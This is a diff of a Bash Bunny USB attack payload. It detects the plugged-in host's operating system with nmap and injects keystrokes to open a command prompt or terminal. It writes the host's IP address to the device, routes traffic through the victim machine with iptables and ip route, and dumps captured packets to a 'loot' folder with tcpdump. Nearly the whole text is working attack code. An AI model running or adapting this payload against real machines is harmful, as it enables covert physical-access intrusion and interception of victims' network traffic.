@@ -1,9 +1,27 @@
 if [ -f "/root/udisk/payloads/connectedip.txt" ] ; then
     rm /root/udisk/payloads/connectedip.txt
 fi
-ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+lootfolder="/root/udisk/payloads/$SWITCH_POSITION/loot"
+ATTACKMODE RNDIS_ETHERNET
+#ATTACKMODE ECM_ETHERNET STORAGE HID VID_0X05AC PID_0X021E
 DELAY 3000
-LED R G B 1000
+source bunny_helpers.sh
+## Open ethernet device, most OS support RNDIS so we will try this to start with.
+
+#we need to discover the OS we plugged in to
+LED R G B 200
+if nmap -Pn -O $TARGET_IP | grep Running | grep Windows ; then
+    OS='Windows'
+else
+    OS='Unix'
+fi
+LED B
+
+
+function get-internet-ip-windows {
+#if using windows we can get the IP of internet adapter
+LED G 200
+DELAY 5000
 QUACK GUI r
 QUACK STRING cmd.exe
 QUACK ENTER
@@ -19,11 +37,6 @@ QUACK SPACE
 QUACK STRING for \/f \"usebackq tokens\=2 delims\=\:\" \%f in \(\`ipconfig \^\| findstr \/c\:\%ip_address_string\%\`\) do set bbIP\=\%f
 QUACK ENTER
 DELAY 1000
-QUACK STRING echo \%mybb\%
-QUACK ENTER
-QUACK STRING echo \%bbIP\%
-QUACK ENTER
-DELAY 1000
 QUACK SPACE
 QUACK STRING echo \%bbIP\% 
 QUACK SPACE
@@ -35,23 +48,62 @@ QUACK ENTER
 DELAY 100
 QUACK STRING exit
 QUACK ENTER
+}
 
-ATTACKMODE RNDIS_ETHERNET 
-#ATTACKMODE ECM_ETHERNET
-LED B 200
-source bunny_helpers.sh
-lootfolder="/root/udisk/payloads/$SWITCH_POSITION/loot"
-if [ ! -d $lootfolder ] ; then 
-    mkdir $lootfolder
+function get-internet-ip-unix {
+   DELAY 10000
+   QUACK CTRL-ALT t
+   sleep 5
+   QUACK STRING mountBB\=\$\(devs\=\$\(ls \-al \/dev\/disk\/by\-path\/\*usb\*
+   QUACK SPACE
+   QUACK STRING 2\>\/dev\/null \| awk \'\{print \$11 \}\'\)\; 
+   QUACK STRING for dev in \$devs\; do dev\=\$\{dev\#\#\*\\\/\}\; echo \-n \"\"\;
+   QUACK STRING echo \-n \$\(mount \| grep \$\{dev\} \| awk \'\{print \$3 \}\'\)
+   QUACK STRING \; echo \"\"\; done \| grep BashBunny\)
+   QUACK ENTER
+   QUACK STRING ifconfig \| grep inet \| sed \'\/inet6\/d\' 
+   QUACK STRING \| sed \'\/127\.0\.0\.1\/d\' \| awk \'\{print \$2\}\'
+   QUACK STRING \> \$mountBB\/payloads\/connectedip
+   QUACK STRING .
+   QUACK STRING txt
+   DELAY 200
+   QUACK ENTER
+### NEED TO ADD SOME IPTABLES HERE ??? 
+### Route connection to BB  and share connection with BB
+   QUACK STRING exit
+   QUACK ENTER
+   DELAY 1000
+}
+
+
+
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+## there is an issue running rndis with other modes
+## so we need to switch to use them
+
+if [ $OS == 'Windows' ] ; then
+    get-internet-ip-windows
+    ATTACKMODE RNDIS_ETHERNET
+else
+    get-internet-ip-unix
+    ATTACKMODE ECM_ETHERNET
 fi
+
+#quit if we didnt get internet ip
 if [ ! -f "/root/udisk/payloads/connectedip.txt" ] ; then
     LED R 100
     exit
 fi
+#make a loot folder
+if [ ! -d $lootfolder ] ; then 
+    mkdir $lootfolder
+fi
+
+#################### IP TABLES ####
+DELAY 1000
+source bunny_helpers.sh
 InternetIP=$(cat /root/udisk/payloads/connectedip.txt)
 echo 1 > /proc/sys/net/ipv4/ip_forward
-
-DELAY 1000
 ip route del
 ip route del
 iptables -F
@@ -63,6 +115,8 @@ ip route flush 0.0.0.0
 route add 0.0.0.0 gw $TARGET_IP netmask 0.0.0.0 dev usb0
 DELAY 1000
 ip route add $InternetIP via $TARGET_IP dev usb0
+####################################
+
 
 LED R B
 tcpdump -i usb0 > $lootfolder/tcpdump.txt
